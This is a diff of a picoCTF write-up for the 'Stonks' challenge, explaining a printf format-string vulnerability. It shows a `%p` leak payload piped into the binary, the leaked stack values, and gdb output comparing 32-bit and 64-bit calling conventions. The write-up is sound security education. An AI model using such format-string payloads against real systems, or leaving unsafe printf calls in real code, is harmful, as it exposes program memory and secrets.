@@ -1,18 +1,16 @@
-# Stonks
-
-## Problem Definition
+# Problem Definition
 
 I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/fdf270d959fa5231e180e2bd11421d0c/vuln.c) `nc mercury.picoctf.net 16439`
 
-## Solution
+# Solution
 
 When we examine the program with a code editor we see that it's using the unsafe version of `printf` when getting the users' authorization token.
 
-With the unsafe version of `printf` we can then dump content of the binary and execute code. Also, important to know for this are calling conventions. When first looking at the problem we noticed that the server was dumping _some_ data from the program but not which data.
+With the unsafe version of `printf` we can then dump content of the binary and execute code. Also, important to know for this are calling conventions. When first looking at the problem we noticed that the server was dumping _some_ data from the program but not which data. 
 
 Consider our experimental setup from below:
 
-`$ ./vuln < <(python3 -c "print(1);print('%p.' * 20)")`
+`$ ./vuln < <(python3 -c "print(1);print('%p.' * 20)")` 
 
 Which dumped us the following values from the program.
 
@@ -23,19 +21,20 @@ Which dumped us the following values from the program.
 0x7f3008b4fe79.0x7f3008ca1760.0x7f3008b50283.0x14.
 ```
 
-While we know that some of the values are ascii characters we could not find indicators as to why the first to variables were `1`s. The solution was that under `64 bit` Linux the calling convention for syscalls takes arguments from the registers first, unlike with `32 bit` Linux. When compiling the binary under `32 bit` with the flag `-m32` in `gcc` we see that we get a different result:
 
-```
+While we know that some of the values are ascii characters we could not find indicators as to why the first to variables were `1`s. The solution was that under `64 bit` Linux the calling convention for syscalls takes arguments from the registers first, unlike with `32 bit` Linux. When compiling the binary under `32 bit` with the flag `-m32` in  `gcc` we see that we get a different result:
+
+```C
 0x567bb3d0.0x565caff4.0x565c84ae.0xf7f76da0.0x7d4.0xf7f76de7.0x6f636970.0x7b465443.
 0x625f3631.0x5f737469.0x74736e69.0x5f643433.0x385f666f.0x3636325f.0x32633438.
 0xff007d30.0xf7fcac18.0xf7f8e800.0x1.0x1.
 ```
 
-### Verification of our Hypotheses
+## Verification of our Hypotheses
 
 To verify this hypotheses we constructed a smaller binary from this source:
 
-```c
+```C
 #include<stdio.h>
 #include <string.h>
 
@@ -53,7 +52,7 @@ int main()
 
 Verification with `gdb` indicated that it was indeed the case that `printf` took variables for the `32 bit` version from the stack first instead of using the registers like in the `64 bit` version. We used the format string `%p.%p.%p.%p.%p.%p.` and got `0xffffcd3d.0xf7da8a2f.0x565561d4.0xf7fc14a0.0xf7fd98cb.0xf7da8a2f.` as an answer. This is verified by taking a look at the stack from `gdb` at the time when `printf` is called. Since `printf` now takes all arguments from the stack we also see that we leak pointers that lie behind this.
 
-```c
+```C
 [----------------------------------registers-----------------------------------]
 EAX: 0xffffcd3d ("%p.%p.%p.%p.%p.%p.\n")
 EBX: 0x56558ff4 --> 0x3ef0
